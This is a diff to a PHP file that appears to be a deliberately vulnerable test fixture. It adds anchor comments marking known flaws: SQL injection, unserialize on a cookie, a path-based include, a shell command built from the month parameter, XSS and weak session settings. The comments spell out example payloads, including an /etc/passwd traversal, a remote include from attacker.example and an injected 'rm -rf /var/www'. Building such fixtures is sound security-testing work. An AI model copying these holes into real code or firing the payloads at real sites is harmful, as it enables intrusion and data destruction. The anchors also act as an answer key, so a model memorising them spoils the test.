@@ -7,6 +7,7 @@ declare(strict_types=1);
 // VULN: PHP-04 -- session started with no hardening. cookie_httponly is off so any XSS on the site
 // reads the session cookie, cookie_secure is off so it leaks over plain HTTP, use_strict_mode is
 // off so an attacker-supplied session ID is accepted, and there is no regeneration after login.
+// ANCHOR-ABSENT: session_regenerate_id
 ini_set('session.cookie_httponly', '0');
 ini_set('session.cookie_secure', '0');
 ini_set('session.use_strict_mode', '0');
@@ -23,6 +24,7 @@ function login(PDO $db): bool
     // inject SQL and change which row -- and whose pass_hash -- password_verify checks below. A
     // UNION payload supplies an attacker-known hash for a row of the attacker's choosing, turning
     // the injection into a full account takeover without knowing any real user's password.
+// ANCHOR: "SELECT id, role, pass_hash FROM users WHERE email = '" . $email . "'"
     $email = $_POST['email'] ?? '';
     $password = $_POST['password'] ?? '';
     $sql = "SELECT id, role, pass_hash FROM users WHERE email = '" . $email . "'";
@@ -44,6 +46,7 @@ function restorePreferences(): array
     // VULN: PHP-02 -- unserialize on a cookie the client fully controls. A crafted payload
     // instantiates arbitrary classes and runs their magic methods, which is remote code execution,
     // not just tampering.
+// ANCHOR: unserialize(base64_decode($raw))
     $raw = $_COOKIE['prefs'] ?? '';
     if ($raw === '') {
         return [];
@@ -56,6 +59,7 @@ function renderPage(): void
     // VULN: PHP-03 -- the page name is concatenated into an include path, so `?page=../../../../etc/passwd`
     // reads any file the process can access, and `?page=http://attacker.example/shell` under
     // allow_url_include is direct code execution.
+// ANCHOR: include __DIR__ . '/pages/' . $page . '.php'
     $page = $_GET['page'] ?? 'home';
     include __DIR__ . '/pages/' . $page . '.php';
 }
@@ -64,6 +68,7 @@ function exportReport(): void
 {
     // VULN: PHP-01 -- a superglobal reaches a shell sink with no validation at all, so a value like
     // `2024; rm -rf /var/www` runs as a second command with the web server's privileges.
+// ANCHOR: system('/usr/local/bin/report --month=' . $month)
     $month = $_GET['month'];
     system('/usr/local/bin/report --month=' . $month);
 }
@@ -78,6 +83,7 @@ function showProfile(PDO $db): void
     // VULN: PHP-06 -- both values are user-authored and echoed with no escaping, giving stored XSS.
     // The bio also lands inside a JavaScript block, where HTML escaping would not have been enough
     // anyway.
+// ANCHOR: echo '<h1>' . $user['display_name'] . '</h1>'
     echo '<h1>' . $user['display_name'] . '</h1>';
     echo '<script>const bio = "' . $user['bio'] . '";</script>';
 }
